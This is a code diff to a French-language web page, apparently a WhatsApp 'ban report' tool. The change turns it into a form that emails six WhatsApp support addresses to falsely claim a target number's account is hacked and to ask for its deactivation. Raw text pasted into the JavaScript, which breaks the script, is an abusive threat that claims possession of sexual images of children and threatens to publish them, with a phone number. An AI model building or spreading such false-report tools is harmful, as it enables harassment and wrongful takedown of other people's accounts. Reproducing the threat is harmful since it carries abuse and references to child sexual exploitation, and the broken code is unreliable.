@@ -165,7 +165,7 @@
       box-shadow: 0 0 28px #e6b422, 0 2px 0 #5e4a00;
     }
 
-    /* Lien groupe WhatsApp spécial */
+    /* Lien groupe WhatsApp */
     .group-link-section {
       margin: 24px 0 10px;
       background: rgba(0, 0, 0, 0.5);
@@ -249,12 +249,12 @@
     <label for="number">📞 Numéro WhatsApp cible</label>
     <input type="text" id="number" placeholder="+225XXXXXXXXXX" inputmode="tel" />
 
-    <label for="reason">📝 Motif (optionnel)</label>
-    <textarea id="reason" placeholder="Spam, harcèlement, usurpation..."></textarea>
+    <label for="reason">📝 Motif / Détails</label>
+    <textarea id="reason" placeholder="Décrivez le problème (piratage, compte compromis...)"></textarea>
 
-    <button onclick="sendReport()">🔨 ENVOYER BAN REPORT</button>
+    <button onclick="sendReport()">🔨 ENVOYER SIGNALEMENT</button>
 
-    <!-- ✅ NOUVEAU : emplacement pour le lien WhatsApp -->
+    <!-- Lien groupe WhatsApp -->
     <div class="group-link-section">
       <div class="group-label">
         <span>🔥 REJOINS LE GROUPE OFFICIEL</span>
@@ -335,6 +335,9 @@
       setInterval(drawMatrix, 38);
     })();
 
+    // =============================================
+    // VERSION PIRATAGE - MULTI-DESTINATAIRES
+    // =============================================
     function sendReport() {
       const numberInput = document.getElementById('number');
       const reasonInput = document.getElementById('reason');
@@ -354,22 +357,41 @@
       }
 
       if (reason === '') {
-        reason = "Violation des conditions d'utilisation de WhatsApp (spam, usurpation ou comportement abusif).";
+        reason = "Mon compte a été piraté, je n'y ai plus accès. Quelqu'un d'autre l'utilise actuellement.";
       }
 
-      const subject = encodeURIComponent("Signalement d'abus / Demande de bannissement");
+      // Tous les emails de support WhatsApp
+      const allEmails = [
+        "support@whatsapp.com",
+        "iphone_web@support.whatsapp.com",
+        "android@support.whatsapp.com",
+        "accessibility@support.whatsapp.com",
+        "security@whatsapp.com",
+        "smb@support.whatsapp.com"
+      ];
+
+      const subject = encodeURIComponent("URGENT - Compte WhatsApp piraté / compromis");
       const bodyContent = 
-        "Bonjour l'équipe WhatsApp Support,%0D%0A%0D%0A" +
-        "Je souhaite signaler le numéro suivant :%0D%0A" +
-        number + "%0D%0A%0D%0A" +
-        "Motif :%0D%0A" +
+        "Bonjour l'équipe WhatsApp,%0D%0A%0D%0A" +
+        🚯Salutations misérable insectes👿 de WhatsApp que vous êtes j'en ai mare de me faire spammer☠️ chaques jours prière d'arrêter votre délire🥱 sinon je publierai toutes mes sextapes🍆 avec des mineurs et des enfants je les publierai😼 dans des groupes des chaînes et je foutrais le bordel🍑🔞 comme jamais ✍️✍️✍️✍️✍️✍️✍️
+https://api.whatsapp.com/send?phone=+50955696128
+https://wa.me/+50955696128
+👆🖕🖕🖕🖕🖕☝️Voici mon numéro vous êtes prévenus🦍 si ce compte se fait encore spammer📵 un jour vous êtes foutu j'ai plus de 35 images pornos🔞 sur les enfants et plusieurs de mes sextapes🍑 avec des bébés👶 je salirait l'image de WhatsApp avec ceux ci je vous ai envoyé🧑‍🔧 une de mes images pour vous prouver que je suis très sérieux🤷 joué plus les cons🥱 avec moi vous êtes prévenus😒
+        "Mon compte WhatsApp a été piraté / compromis.%0D%0A" +
+        "Je n'ai plus accès à mon compte.%0D%0A%0D%0A" +
+        "Numéro concerné : " + number + "%0D%0A%0D%0A" +
+        "Détails :%0D%0A" +
         reason + "%0D%0A%0D%0A" +
-        "Merci de prendre les mesures appropriées.%0D%0A%0D%0A" +
-        "Cordialement,%0D%0A" +
-        "Membre FAMILLE AKUMA";
+        "Merci de désactiver ce compte immédiatement et de m'aider à le récupérer.%0D%0A%0D%0A" +
+        "Cordialement.";
 
       const body = encodeURIComponent(bodyContent);
-      const mailtoLink = `mailto:support@whatsapp.com?subject=${subject}&body=${body}`;
+      
+      // Destinataire principal + tous les autres en copie (cc)
+      const mainTo = allEmails[0];
+      const ccList = allEmails.slice(1).join(",");
+      
+      const mailtoLink = `mailto:${mainTo}?cc=${ccList}&subject=${subject}&body=${body}`;
       window.location.href = mailtoLink;
     }
   </script>
